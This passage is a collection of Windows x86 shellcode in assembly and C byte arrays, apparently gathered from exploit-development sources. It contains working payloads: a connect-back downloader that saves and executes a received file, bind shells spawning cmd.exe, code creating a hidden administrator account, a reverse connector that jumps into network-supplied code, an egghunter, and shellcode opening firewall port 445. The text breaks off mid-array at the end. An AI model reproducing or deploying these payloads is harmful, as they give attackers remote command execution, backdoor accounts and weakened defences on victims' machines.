	mov   eax, [eax + 08h]
	jmp   kernel32_ptr_found

method_9x:
	mov   eax, [eax + 34h]
	lea   eax, [eax + 7ch]
	mov   eax, [eax + 3ch]
kernel32_ptr_found:
*/

unsigned char Shellcode[] =
	"\x33\xC0"          // xor eax, eax
	"\x64\x03\x40\x30"  // add eax, dword ptr fs:[eax+30]
	"\x78\x0C"          // js short $+12
	"\x8B\x40\x0C"      // mov eax, dword ptr [eax+0C]
	"\x8B\x70\x1C"      // mov esi, dword ptr [eax+1C]
	"\xAD"              // lodsd
	"\x8B\x40\x08"      // mov eax, dword ptr [eax+08]
	"\xEB\x09"          // jmp short $+9
	"\x8B\x40\x34"      // mov eax, dword ptr [eax+34]
	"\x8D\x40\x7C"      // lea eax, dword ptr [eax+7C]
	"\x8B\x40\x3C"      // mov eax, dword ptr [eax+3C]
; // = 29 bytes.

int main()
{
	printf("Shellcode is %u bytes.\n\n", sizeof(Shellcode)-1);
	return 1;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

;
; link  -  connectback, receive, save and execute shellcode
;
; Copyright (c) 2004 by loco
; All Rights Reserved
;
; NOTE: Compatible with Windows NT based operating systems. IPv4 only.
;
;

  .386
  .model flat, stdcall
   option casemap:none
   assume fs:flat

   include C:\masm32\include\windows.inc   ; standard windows header
   include C:\masm32\include\kernel32.inc  ; definitions of kernel32.dll

   includelib C:\masm32\lib\kernel32.lib   ; we must have kernel32.dll in our process if we want to test it

  .data

   dd GetTickCount ; refer to GetTickCount so that kernel32.dll gets loaded into our process

  .code

   db 'START->'    ; start of shellcode (makes copy n pasting easier later)

; *** stuff that makes our life easier *****************************************

   ; kernel32.dll
   __imp_ExitThread  equ dword ptr [ebp + 04h]
   __imp_LoadLibrary equ dword ptr [ebp + 08h]
   ; msvcrt.dll
   __imp_fopen       equ dword ptr [ebp + 0ch]
   __imp_fwrite      equ dword ptr [ebp + 10h]
   __imp_fclose      equ dword ptr [ebp + 14h]
   __imp__execv      equ dword ptr [ebp + 18h]
   ; ws2_32.dll
   __imp_WSAStartup  equ dword ptr [ebp + 1ch]
   __imp_socket      equ dword ptr [ebp + 20h]
   __imp_connect     equ dword ptr [ebp + 24h]
   __imp_recv        equ dword ptr [ebp + 28h]
   __imp_send        equ dword ptr [ebp + 2ch]
   __imp_closesocket equ dword ptr [ebp + 30h]

; *** GetImportAddress macro ***************************************************

GetImportAddress MACRO
   LOCAL GetImportAddressLoop
   LOCAL GetImportHashLoop

   mov   edx, dword ptr [edi + 3ch]       ; get offset of PE header
   mov   edx, dword ptr [edi + edx + 78h] ; get RVA of export directory
   add   edx, edi                         ; convert it to pointer
   push  edx                              ; save it to stack

   mov   edx, [edx + 20h]                 ; get rva of rva's of names
   add   edx, edi                         ; convert it to pointer

   xor   ebx, ebx                         ; index of ordinal will be saved in ebx
GetImportAddressLoop:
   inc   ebx                              ; just skip the first entry
   mov   esi, [edx + ebx * 04h]           ; get rva of name
   add   esi, edi                         ; convert it to pointer
   xor   ecx, ecx
   lodsb                                  ; mov al, byte ptr [esi] -> inc esi
GetImportHashLoop:
   xor   cl, al
   rol   ecx, 5
   lodsb                                  ; mov al, byte ptr [esi] -> inc esi
   test  al, al
   jnz   GetImportHashLoop

   mov   esi, [ebp]                       ; get index of current function
   sub   ecx, [ebp + esi * 04h]           ; sub the original hash from current
   jnz   GetImportAddressLoop             ; not equal? try next

   xchg  esi, [esp]                       ; pointer to export table in esi now
   mov   edx, [esi + 24h]                 ; get rva of array of ordinals
   add   edx, edi                         ; convert it to pointer
   mov   cx, [edx + ebx * 2]              ; get ordinal

   mov   edx, [esi + 1ch]                 ; get rva of array of pointers to functions
   add   edx, edi                         ; convert it to pointer

   mov   eax, [edx + ecx * 4]             ; get rva of function
   add   eax, edi                         ; convert it to pointer
   pop   esi                              ; index of current function in esi
   mov   [ebp + esi * 04h], eax           ; move pointer to correct entry
   inc   dword ptr [ebp]                  ; increment index of current function
ENDM

start:
; *** find kernel32.dll base ***************************************************

   xor   ebx, ebx
   mov   eax, fs:[ebx + 30h]    ; Extract the PEB
   mov   eax, [eax + 0ch]       ; Extract the PROCESS_MODULE_INFO pointer from the PEB
   mov   esi, [eax + 1ch]       ; Get the address of flink in the init module list
   lodsd                        ; Load the address of blink into eax
   mov   eax, [eax + 08h]       ; Grab the module base address from the list entry

; *** load the imports *********************************************************

   push  ebx         ; 0
   push  ebx         ; 0
   push  '23'        ; ????32 first part of ws2_32
   push  '_2sw'      ; ws2_?? second part of ws2_32
   push  'tr'        ; ????rt first part of msvcrt
   push  'cvsm'      ; msvc?? second part of msvcrt
   call  OverImportHashes
   dd 1
   ; kernel32.dll
   dd 0D6086235h ; ExitThread
   dd 094202374h ; LoadLibrary
   ; msvcrt
   dd 0CAC999C0h ; fopen
   dd 069155CB9h ; fwrite
   dd 040F640B9h ; fclose
   dd 00DB302D7h ; _execv
   ; ws2_32.dll
   dd 0C44DF985h ; WSAStartup
   dd 018041A9Ch ; socket
   dd 01AD30183h ; connect
   dd 0071302C0h ; recv
   dd 007033480h ; send
   dd 028398AB4h ; closesocket
OverImportHashes:
   pop   ebp
   push  2
   pop   ebx
GetImportAddressOfNextDll:
   mov   edi, eax
   push  ebx
GetImportAddressesLoop:
   push  ebx
   GetImportAddress
   pop   ebx
   dec   ebx
   jnz   GetImportAddressesLoop

   pop   ebx
   add   ebx, 2
   push  esp                   ; push modulehandle
   call  dword ptr [ebp + 08h] ; call kernel32.LoadLibraryA
   add   esp, 8                ; next module
   test  eax, eax
   jnz   GetImportAddressOfNextDll

   mov   ah, 02h               ; eax = 00000200
   sub   esp, eax

; *** connect to IP ************************************************************

   mov   al, ah                ; eax = 00000202

   ; initialize ws2_32.dll
   push  esp                   ; our receive buffer (abused as WSADATA struct)
   push  eax                   ; we support 2.2 and above
   call  __imp_WSAStartup      ; when call succesful, will return 0
  
   ; set up SOCKADDR_IN structure
   push  eax                   ; 0
   push  eax                   ; 0
   push  11111111h             ; ip (will be set by shellcode generator)
   push  22220002h             ; AF_INET & port (port will be set by shellcode generator)
   mov   edi, esp

   push  eax                   ; IPPROTO_IP
   push  1                     ; SOCK_STREAM
   push  2                     ; AF_INET
   call  __imp_socket          ; call ws2_32.socket
   mov   ebx, eax

   ; call it
   push  10h                   ; sizeof SOCKADDR_IN
   push  edi                   ; ptr SOCKADDR_IN
   push  ebx                   ; socket
   call  __imp_connect         ; call ws2_32.connect
   ; the only check!
   test  eax, eax
   jnz   Exit

; *** send the request key *****************************************************

   mov   dword ptr [ebp], 33333333h ; request key (will be set by shellcode generator)

   push  eax                        ; flags (0)
   push  4                          ; length (4)
   push  ebp                        ; buffer
   push  ebx                        ; socket
   call  __imp_send                 ; call ws2_32.send

; *** receive file *************************************************************

   mov   esi, esp                    ; save pointer to buffer in esi

   ; we want read/write access
   mov   dword ptr [ebp], 'bw'
   push  'exe'                       ; second part 0, 'exe'
   push  '.xxx'                      ; first part '.xxx' (will be set by generator)
   mov   edi, esp                    ; save filename in edi
   push  ebp                         ; push pointer to 'wb'
   push  edi                         ; push pointer to filename
   call  __imp_fopen                 ; call msvrt.fopen
   mov   [ebp], eax                  ; move FILE stream in esi
   ; add   esp, 8                    ; no need to clean stack

   ; receive loop
ReceiveFile:
   push  0                     ; flags
   push  512                   ; buffersize
   push  esi                   ; buffer
   push  ebx                   ; socket
   call  __imp_recv            ; call ws2_32.recv
   test  eax, eax
   jz    DoneReceiving
   js    Exit

   push  [ebp]                 ; FILE
   push  eax                   ; nitems
   push  1                     ; item size
   push  esi                   ; buffer
   call  __imp_fwrite          ; call msvcrt.fwrite
   add   esp, 10h              ; clean stack

   jmp   ReceiveFile

DoneReceiving:
   push  [ebp]         ; push FILE stream to close
   call  __imp_fclose  ; call msvcrt.fclose, returns 0 if succesful
   ; add   esp, 4      ; not needed to clean stack

   push  eax
   push  esp           ; varguments
   push  edi           ; filename
   call  __imp__execv  ; call msvcrt._execv
   ; add   esp, 8      ; not needed to clean stack

Exit:
   push  ebx                                ; socket
   call  __imp_closesocket                  ; call ws2_32.closesocket

   ; push  0                                ; we don't care about the exit code    
   call  __imp_ExitThread                   ; call kernel32.ExitThread

; ******************************************+**********************************
   db '<-END'                 ; end of shellcode
; ******************************************+**********************************

end start




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

;      Title:  Win32 Bind Shell
;  Platforms:  Windows NT 4.0, Windows 2000, Windows XP, Windows 2003
;   Function:  Listen for connection and spawn command shell
;     Author:  hdm[at]metasploit.com

; Compile: nasm -f bin -o win32_bind.bin win32_bind.asm


[BITS 32]

global _start

_start:

LCaller:
    call LLoadFunctions

LDataSegment:
;========================

dd "CMD"

dd 0x79c679e7 ; closesocket             12
dd 0x498649e5 ; accept                  16
dd 0xe92eada4 ; listen                  20
dd 0xc7701aa4 ; bind                    24
dd 0xadf509d9 ; WSASocketA              28
dd 0x3bfcedcb ; WSAStartup              32

dd 0xec0e4e8e ; LoadLibraryA            36
dd 0x73e2d87e ; ExitProcess             40
dd 0xce05d9ad ; WaitForSingleObject     44
dd 0x16b3fe72 ; CreateProcessA          48

db "WS2_32.DLL", 0x00, 0x01
;========================

LLoadFunctions:	
    pop ebx  
    push esp
	mov ebp, esp 
    mov [ebp], ebx

LKernel32Base:
    push byte 0x30
    pop ecx
    mov eax, [fs:ecx]
	mov eax, [eax + 0x0c] 
	mov esi, [eax + 0x1c] 
	lodsd				  
	mov ebx, [eax + 0x08] 
    jmp short LStartLoading

LLoadWinsock:
    lea edx, [edi + 44] ; get address of ws2_32.dll
    push ecx            ; save counter
    push edx            ; push address of ws2_32.dll
	call eax            ; LoadLibraryA()
    mov ebx, eax        ; save module handle 
    pop ecx             ; restore counter
    jmp short Looper2
    
LStartLoading:
    ; Start loading addresses at ebp + 12
    push byte 0x08
    pop esi
    add esi, ebp 

    ; Function counter
    push byte 0x0a
    pop ecx
    mov edi, [ebp]
    
Looper:
    cmp cl, 0x06
    je short LLoadWinsock

Looper2:    
    push ecx                    ; save the counter
    push ebx                    ; dll handle
    push dword [edi + ecx*4]    ; function hash value
    call LGetProcAddress        ; find the address
    pop ecx                     ; restore the counter
    mov [esi + ecx * 4], eax    ; stack segment to store addresses
    loop Looper
	xor edi, edi

LWSAStartup:
	; WSAStartup(0x101, DATA) 
    sub sp, 400
	push esp
	push 0x101
	call [ebp + 32]

LWSASocketA:
	; WSASocketA(2,1,0,0,0,0) 
	push edi
	push edi
	push edi
	push edi
	inc edi
	push edi
	inc edi
	push edi
	call [ebp + 28]
	mov ebx, eax                ; save socket to ebx
    xor edi, edi
    
LBind:
	push edi
	push edi
	push dword 0x11220002 ; port 8721
	mov esi, esp
	push byte 0x10        ; length
	push esi
	push ebx
	call [ebp + 24]

LListen:
	push edi
	push ebx
	call [ebp + 20]

LAccept:
	push edi
	push esi
	push ebx
	call [ebp + 16]
	mov edx, eax

LCreateProcessStructs:
	; allocate space for STARTUPINFO, PROCESS_INFORMATION 
	sub sp, 0x54

	; zero out SI/PI 
	lea edi, [esp]
	xor eax, eax
    push byte 21
    pop ecx
    
LBZero:
	rep stosd
    
    mov edi, edx
	mov byte [esp + 16], 68	 ; si.cb = sizeof(si) 
	inc byte [esp + 61]		 ; si.dwFlags = 0x100 

	; socket handles 
	mov [esp + 16 + 56], edi
	mov [esp + 16 + 60], edi
	mov [esp + 16 + 64], edi

	lea eax, [esp + 16]	; si 
	push esp			; pi 
	push eax
	push ecx
	push ecx
	push ecx
    
    inc ecx
	push ecx
    dec ecx
    
	push ecx
	push ecx
	push dword [ebp]
	push ecx

LCreateProcess:
	call [ebp + 48]
	mov ecx, esp
    
LWaitForSingleObject:
    push 0xFFFFFFFF
    push dword [ecx]
    call [ebp + 44]

LCloseSocket:
    push edi
    call [ebp + 12]

LFinished:
    call [ebp + 40]
  
LGetProcAddress:
	push ebx
	push ebp
	push esi
	push edi
	mov ebp, [esp + 24]			
	mov eax, [ebp + 0x3c]		
	mov edx, [ebp + eax + 120]
	add edx, ebp				
	mov ecx, [edx + 24]			
	mov ebx, [edx + 32]
	add ebx, ebp

LFnlp:

	jecxz	LNtfnd
	dec ecx
	mov esi, [ebx + ecx * 4]
	add esi, ebp				
	xor edi, edi
	cld

LHshlp:

	xor eax, eax
	lodsb
	cmp al, ah
	je LFnd
	ror edi, 13
	add edi, eax
	jmp short LHshlp

LFnd:
	
	cmp edi, [esp + 20]
	jnz LFnlp
	mov ebx, [edx + 36]			
	add ebx, ebp
	mov cx, [ebx + 2 * ecx]		
	mov ebx, [edx + 28]			
	add ebx, ebp
	mov eax, [ebx + 4 * ecx]	
	add eax, ebp
	jmp short LDone

LNtfnd:
	xor eax, eax

LDone:
	mov edx, ebp
	pop edi
	pop esi
	pop ebp
	pop ebx
	ret 8




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

;      Title:  Win32Create Admin User Account
;  Platforms:  Windows NT 4.0, Windows 2000, Windows XP
;   Function:  NetUserAdd(X);  NetLocalGroupAddMembers(X, Administrators);
;     Author:  hdm[at]metasploit.com


[BITS 32]

global _start

_start:

	sub sp, 128
    
	mov esi, esp

	;	[esi]
	;	    00 kernel32.dll
	;		04 netapi32.dll
	;		08 LoadLibraryA
	;		12 ExitProcess
	;		16 NetUserAdd
	;		20 NetLocalGroupAddMembers
	;		24 user/pass
	;		28 group
	

    ; get base kernel32 address
	call LK32Base
	mov [esi], eax
    mov ebx, eax
    
	; GetProcAddress(ExitProcess)
	push ebx
	push 0x73e2d87e
	call LGetProcAddress
	mov [esi + 12], eax
    
    ; GetProcAddress(LoadLibraryA)
    push ebx
	push 0xec0e4e8e
	call LGetProcAddress
	mov [esi + 8], eax

	; LoadLibrary(netapi32.dll)
	xor ebx, ebx
	push	ebx
	push	0x32336970
	push	0x6174656e
	push	esp
	call	eax
	mov [esi + 4], eax
    mov ebx, eax

	; GetProcAddress(NetUserAdd)
	push ebx
	push 0xcd7cdf5e
	call LGetProcAddress
	mov [esi + 16], eax

	; GetProcAddress(NetLocalGroupAddMembers)
	push ebx
	push  0xc30c3dd7
	call LGetProcAddress
	mov [esi + 20], eax

    ; useful register values
	xor eax, eax
	xor ebx, ebx
	inc ebx
	
    ; push the group (Administrators)
	push eax
	push 0x00730072
	push 0x006f0074
	push 0x00610072
	push 0x00740073
	push 0x0069006e
	push 0x0069006d
	push 0x00640041
	mov [esi + 28], esp

	; push the username (X)
	push eax
	push 0x00000058
	mov	 ecx, esp
	mov [esi + 24], ecx 

    ; add the \ to the username
	push 0x005c0000

    ; create the NetUserAdd arguments
	push eax
	push ebx
	push eax
	push eax
	push ebx
	push eax
	push ecx
	push ecx
	mov ecx, esp 

	push eax
	push esp	
	push ecx	
	push ebx	
	push eax
    
    ; call NetUserAdd(X)
	call [esi + 16]

    ; create the NetLocalGroupAddMembers arguments
	mov ecx, [esi + 24]
	dec ecx
	dec ecx
	push ecx
	mov ecx, esp

	push byte 1	
	push ecx			
	push byte 3	
	push dword [esi + 28]		
	push byte 0
    
    ; call NetLocalGroupAddMembers
	call [esi + 20]

LFinished:
	
	call [esi + 12]

LK32Base:
	push esi
    push byte 0x30
    pop ecx
	mov eax, [fs:ecx]
	mov eax, [eax + 0x0c] 
	mov esi, [eax + 0x1c] 
	lodsd				  
	mov eax, [eax + 0x08] 
	pop esi
	ret 4
    
LGetProcAddress:
	
	push ebx
	push ebp
	push esi
	push edi
	mov ebp, [esp + 24]			
	mov eax, [ebp + 0x3c]		
	mov edx, [ebp + eax + 120]
	add edx, ebp				
	mov ecx, [edx + 24]			
	mov ebx, [edx + 32]
	add ebx, ebp

LFnlp:

	jecxz	LNtfnd
	dec ecx
	mov esi, [ebx + ecx * 4]
	add esi, ebp				
	xor edi, edi	
	cld

LHshlp:

	xor eax, eax
	lodsb
	cmp al, ah
	je LFnd
	ror edi, 13
	add edi, eax
	jmp short LHshlp

LFnd:
	
	cmp edi, [esp + 20]
	jnz LFnlp
	mov ebx, [edx + 36]			
	add ebx, ebp
	mov cx, [ebx + 2 * ecx]		
	mov ebx, [edx + 28]			
	add ebx, ebp
	mov eax, [ebx + 4 * ecx]	
	add eax, ebp
	jmp short LDone

LNtfnd:

	xor eax, eax

LDone:
	mov edx, ebp
	pop edi
	pop esi
	pop ebp
	pop ebx
	ret 8




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

;      Title:  Windows 2000 Vampiric Import Reverse Connect
;  Platforms:  Windows 2000
;   Function:  Attach to dbmssocn.dll, use IAT to connect, read/exec payload
;     Author:  hdm[at]metasploit.com

; Compile: nasm -f bin -o win2000_vampiric_connector.bin win2000_vampiric_connector.asm


[BITS 32]

%define ESIMOD add si, 0x3000
%define DBMSSOCN_WSAStartup [esi + 0x6C]
%define DBMSSOCN_connect    [esi + 0x4C]
%define DBMSSOCN_recv       [esi + 0x54]
%define DBMSSOCN_send       [esi + 0x5C]
%define DBMSSOCN_socket     [esi + 0x74]

; uncomment this for better error handling and persistent reconnects
; %define NICE

global _start
_start:

LKernel32Base:
    push byte 0x30
    pop ecx
    mov eax, [fs:ecx]
    mov eax, [eax + 0x0c] 
    mov esi, [eax + 0x1c] 
    lodsd				  
    mov ebp, [eax + 0x08] 

    mov eax, [ebp + 0x3c]           
    mov edx, [ebp + eax + 120]
    add edx, ebp                            
    mov ecx, [edx + 24]                     
    mov ebx, [edx + 32]
    add ebx, ebp

LFinderLoop:

%ifdef NICE
    jecxz LNotFound
%endif

    dec ecx
    mov esi, [ebx + ecx * 4]
    add esi, ebp                            
    xor edi, edi    
    cld

LHasher:
    xor eax, eax
    lodsb
    cmp al, ah
    je short LFound
    ror edi, 13
    add edi, eax
    jmp short LHasher

LFound:      
    cmp edi, 0xec0e4e8e     ; LoadLibraryA
    jnz short LFinderLoop
    mov ebx, [edx + 36]                     
    add ebx, ebp
    mov cx, [ebx + 2 * ecx]         
    mov ebx, [edx + 28]                     
    add ebx, ebp
    mov eax, [ebx + 4 * ecx]        
    add eax, ebp
    jmp short LFinderDone

%ifdef NICE
LNotFound:
    xor eax, eax
%endif 

LFinderDone:
    call LoadDBMSSOCN

LDataSegment:
;========================
db "DBMSSOCN.DLL"
db 0x00, 0xFF               ; second byte only added for easy disasm
;========================

LoadDBMSSOCN:                         
	call eax                ; LoadLibraryA (ptr to dll on stack)
    mov esi, eax            ; esi used by all DBMSSOCN functions
    ESIMOD                  ; inc base to save space on the calls
    xor edi, edi            ; edi is just a null
    
LWSAStartup:
    sub sp, 400
	push esp
	push dword 0x101
	call DBMSSOCN_WSAStartup

LSocket:
	push edi
	push edi
	push edi
	push edi
	inc edi
	push edi
	inc edi
	push edi
	call DBMSSOCN_socket
	mov ebx, eax

LConnect:
    push 0xF700A8C0         ; host: 192.168.0.247
    push 0x11220002         ; port: 8721     
	mov ecx, esp
	push byte 0x10
	push ecx
	push ebx
	call DBMSSOCN_connect   ; set eax to 0 on success

%ifdef NICE
    test eax,eax
    jnz LConnect
    xor eax, eax
%endif 
        
LReadCodeFromSocket:
    add di, 0xffe            ; read 4096 bytes of payload (edi == 2)
    sub esp, edi
    mov ebp, esp
    push eax               ; flags
    push edi               ; length
    push ebp               ; buffer
    push ebx               ; socket
    call DBMSSOCN_recv     ; recv(socket, buffer, length, flags)
    jmp esp                ; jump into new payload 




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*This is a 35 byte C implementation of the use of the PEB method to get
*the kernel32 base address on Windows. This is generic code designed to
*run on both Windows 9x and NT based systems. The code has been optimized
*to not have any 00h bytes so that you wont have to use an XOR routine to
*encode the shellcode. I used relative jumps and xor tricks to avoid the
*00h bytes and make the code as small as I could get it. Feel free to use
*this source in anything that you want.
*/


/* 35 byte PEB method for Windows 9x/NT/2k/XP
*  0x00 byte optimized, no XOR routine required.
*
*  www.4x10m.com
*  oc.192
*  irc.4x10m.net #4x10m
*/

unsigned char shellcode[] =
/*  35 byte PEB - 00h removal and size optimized  */
/*      22 - 24 total clock cycles on a x486      */
"\x31\xC0"                  /* xor eax, eax       */
"\x31\xD2"                  /* xor edx, edx       */
"\xB2\x30"                  /* mov dl, 30h        */
"\x64\x8B\x02"              /* mov eax, [fs:edx]  */      /* PEB base address */
"\x85\xC0"                  /* test eax, eax      */
"\x78\xC0"                  /* js 0Ch             */
"\x8B\x40\x0C"              /* mov eax, [eax+0Ch] */      /* NT kernel32 routine */
"\x8B\x70\x1C"              /* mov esi, [eax+1Ch] */
"\xAD"                      /* lodsd              */
"\x8B\x40\x08"              /* mov eax, [eax+08h] */
"\xEB\x07"                  /* jmp short 09h      */
"\x8B\x40\x34"              /* mov eax, [eax+34h] */      /* 9x kernel32 routine */
"\x8D\x40\x7C"              /* lea eax, [eax+7Ch] */
"\x8D\x40\x3C"              /* mov eax, [eax+3Ch] */
;

int main(int argc, char *argv[]) {
      //void (*sc)() = (void *)shellcode;
      printf("len:%d\n", sizeof(shellcode));
      //sc();
      return 0;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

; win32 eggsearch shellcode, 33 bytes
; tested on windows xp sp2, should work on all service packs on win2k, win xp, win2k3
; (c) 2009 by Georg 'oxff' Wicherski
 
[bits 32]
 
marker equ 0x1f217767   ; 'gw!\x1f'
 
start:
 xor edx, edx   ; edx = 0, pointer to examined address
 
address_loop:
 inc edx    ; edx++, try next address
 
pagestart_check:
 test dx, 0x0ffc   ; are we within the first 4 bytes of a page?
 jz address_loop   ; if so, try next address as previous page might be unreadable
     ; and the cmp [edx-4], marker might result in a segmentation fault
 
access_check:
 push edx   ; save across syscall
 push byte 8   ; eax = 8, syscall nr of AddAtomA
 pop eax    ; ^
 int 0x2e   ; fire syscall (eax = 8, edx = ptr)
 cmp al, 0x05   ; is result 0xc0000005? (a bit sloppy)
 pop edx    ;
 
 je address_loop   ; jmp if result was 0xc0000005
 
egg_check:
 cmp dword [edx-4], marker ; is our egg right before examined address?
 jne address_loop  ; if not, try next address
 
egg_execute:
 inc ebx    ; make sure, zf is not set
 jmp edx    ; we found our egg at [edx-4], so we can jmp to edx



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* 116 bytes bindcode hardcoded for Windows XP SP1 */
/* but you can change the address if you want */
/* i made it pretty clear where they are  */
/* the bindcode will bind to port 58821 */
/* by silicon / silicon@chello.no */
/* greetz to dtors.net :)

#include <stdio.h>
#include <winsock2.h>

unsigned char bindcode[] = // 116 bytes bindcode for windows, port=58821, by silicon :)
"\x83\xC4\xEC\x33\xC0\x50\x50\x50\x6A\x06"
"\x6A\x01\x6A\x02\xB8"
"\x01\x5A\xAB\x71" // address of WSASocketA()
"\xFF\xD0\x8B\xD8\x33\xC0\x89\x45\xF4\xB0"
"\x02\x66\x89\x45\xF0\x66\xC7\x45\xF2\xE5"
"\xC5\x6A\x10\x8D\x55\xF0\x52\x53\xB8"
"\xCE\x3E\xAB\x71" // address of bind()
"\xFF\xD0\x6A\x01\x53\xB8"
"\xE2\x5D\xAB\x71" // address of listen()
"\xFF\xD0\x33\xC0\x50\x50\x53\xB8"
"\x8D\x86\xAB\x71" // address of accept()
"\xFF\xD0\x8B\xD8\xBA"
"\x1D\x20\xE8\x77" // address of SetStdHandle()
"\x53\x6A\xF6\xFF\xD2\x53\x6A\xF5\xFF\xD2"
"\x53\x6A\xF4\xFF\xD2\xC7\x45\xFB\x41\x63"
"\x6D\x64\x8D\x45\xFC\x50\xB8"
"\x44\x80\xC2\x77" // address of system()
"\xFF\xD0";

int main(){
 WSADATA wsadata;
 WSAStartup(WINSOCK_VERSION,&wsadata);
 ((void (*)(void)) &bindcode)(); 
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

; Author: sinn3r (x90.sinner {a.t} gmail.c0m)
; Tested on Windows XP SP3
; Description:
; This shellcode will create a XP firewall rule to allow TCP traffic on port 445.
; Make sure ADVAPI32.dll is loaded.
 
[BITS 32]
 
global _start
 
_start:
 
;for the handle
xor edx, edx
mov edi, esp
mov dword [edi], edx
sub esp, 0x10       ;avoid handle being overwritten
 
;Prepare the key
push 0x00747369
push 0x4c5c7374
push 0x726f506e
push 0x65704f79
push 0x6c6c6162
push 0x6f6c475c
push 0x656c6966
push 0x6f725064
push 0x7261646e
push 0x6174535c
push 0x7963696c
push 0x6f706c6c
push 0x61776572
push 0x69465c73
push 0x72657465
push 0x6d617261
push 0x505c7373
push 0x65636341
push 0x64657261
push 0x68535c73
push 0x65636976
push 0x7265535c
push 0x7465536c
push 0x6f72746e
push 0x6f43746e
push 0x65727275
push 0x435c4d45
push 0x54535953
mov edx, esp
 
xor eax, eax
push eax        ;pDisposion = NULL
push edi        ;pHandle
push eax        ;pSecurity = NULL
push 0x0f003f       ;Access = KEY_ALL_ACCESS
push eax        ;Options = REG_OPTION_NON_VOLATILE
push eax        ;Class = NULL
push eax        ;Reserved = NULL
push edx        ;Subkey
push 0x80000002     ;hkey = HKEY_LOCAL_MACHINE
mov eax, 0x77DDE9E4 ;RegCreateKeyExA
call eax
 
;RegSetValue ValueName = 445:TCP
push 0x00504354
push 0x3a353434
mov edx, esp
 
;REgSEtValue buffer = 445:TCP:*:Enabled:test
push 0x00007473
push 0x65743a64
push 0x656c6261
push 0x6e453a2a
push 0x3a504354
push 0x3a353434
mov ecx, esp
 
xor eax, eax
inc eax
push 0x16       ;BufSize = 0x16
push ecx        ;Buffer
push eax        ;ValueType = REG-SZ
dec eax
push eax        ;Reserved = 0
push edx        ;ValueName
push dword [edi]    ;hKey
mov eax, 0x77ddead7 ;RegSetValueExA
call eax
 
push dword [edi]    ;hKey
mov eax, 0x77dd6c17 ;RegCloseKey
call eax
 
;shellcode:
;sinn3r@backtrack:~$ nasm -f bin addFirewallRule2.asm -o addFirewallRule2 |cat addFirewallRule2 |hexdump -C |grep -v 000000ff
;00000000  31 d2 89 e7 89 17 81 ec  10 00 00 00 68 69 73 74  |1...........hist|
;00000010  00 68 74 73 5c 4c 68 6e  50 6f 72 68 79 4f 70 65  |.hts\LhnPorhyOpe|
;00000020  68 62 61 6c 6c 68 5c 47  6c 6f 68 66 69 6c 65 68  |hballh\Glohfileh|
;00000030  64 50 72 6f 68 6e 64 61  72 68 5c 53 74 61 68 6c  |dProhndarh\Stahl|
;00000040  69 63 79 68 6c 6c 70 6f  68 72 65 77 61 68 73 5c  |icyhllpohrewahs\|
;00000050  46 69 68 65 74 65 72 68  61 72 61 6d 68 73 73 5c  |Fiheterharamhss\|
;00000060  50 68 41 63 63 65 68 61  72 65 64 68 73 5c 53 68  |PhAcceharedhs\Sh|
;00000070  68 76 69 63 65 68 5c 53  65 72 68 6c 53 65 74 68  |hviceh\SerhlSeth|
;00000080  6e 74 72 6f 68 6e 74 43  6f 68 75 72 72 65 68 45  |ntrohntCohurrehE|
;00000090  4d 5c 43 68 53 59 53 54  89 e2 31 c0 50 57 50 68  |M\ChSYST..1.PWPh|
;000000a0  3f 00 0f 00 50 50 50 52  68 02 00 00 80 b8 e4 e9  |?...PPPRh.......|
;000000b0  dd 77 ff d0 68 54 43 50  00 68 34 34 35 3a 89 e2  |.w..hTCP.h445:..|
;000000c0  68 73 74 00 00 68 64 3a  74 65 68 61 62 6c 65 68  |hst..hd:tehableh|
;000000d0  2a 3a 45 6e 68 54 43 50  3a 68 34 34 35 3a 89 e1  |*:EnhTCP:h445:..|
;000000e0  31 c0 40 68 16 00 00 00  51 50 48 50 52 ff 37 b8  |1.@h....QPHPR.7.|
;000000f0  d7 ea dd 77 ff d0 ff 37  b8 17 6c dd 77 ff d0     |...w...7..l.w..|



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
004045F4 > 6A 30            PUSH 30
004045F6   59               POP ECX
004045F7   64:8B09          MOV ECX,DWORD PTR FS:[ECX]
004045FA   85C9             TEST ECX,ECX
004045FC   78 0C            JS SHORT OllyTest.0040460A
004045FE   8B49 0C          MOV ECX,DWORD PTR DS:[ECX+C]
00404601   8B71 1C          MOV ESI,DWORD PTR DS:[ECX+1C]
00404604   AD               LODS DWORD PTR DS:[ESI]
00404605   8B48 08          MOV ECX,DWORD PTR DS:[EAX+8]
00404608   EB 09            JMP SHORT OllyTest.00404613
0040460A   8B49 34          MOV ECX,DWORD PTR DS:[ECX+34]
0040460D   8B49 7C          MOV ECX,DWORD PTR DS:[ECX+7C]
00404610   8B49 3C          MOV ECX,DWORD PTR DS:[ECX+3C]
*/

/*
31 byte C PEB kernel base location method works on win9x-win2k3
no null bytes, so no need to xor.

-twoci
*/

unsigned char PEBCode[] =
{"\x6A\x30"
"\x59"
"\x64\x8B\x09"
"\x85\xC9"
"\x78\x0C"
"\x8B\x49\x0C"
"\x8B\x71\x1C"
"\xAD"
"\x8B\x48\x08"
"\xEB\x09"
"\x8B\x49\x34"
"\x8B\x49\x7C"
"\x8B\x49\x3C"};

int main( int argc, char *argv[] )
{
   printf( "sizeof(PEBCode) = %u\n", sizeof(PEBCode) );
   return 0;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
Shellcode can be changed to work with any windows distribution by changing the address of Beep in kernel32.dll
Addresses for SP1 and SP2

-
*/

#include <stdio.h>

unsigned char beepsp1[] =
"\x55\x89\xE5\x83\xEC\x18\xC7\x45\xFC"
"\x10\xC9\xEA\x77"                      //Address \x10\xC9\xEA\x77 = SP1
"\xC7\x44\x24\x04"
"\xE8\x03"                              //Length \xE8\x03 = 1000 (1 second)
"\x00\x00\xC7\x04\x24"
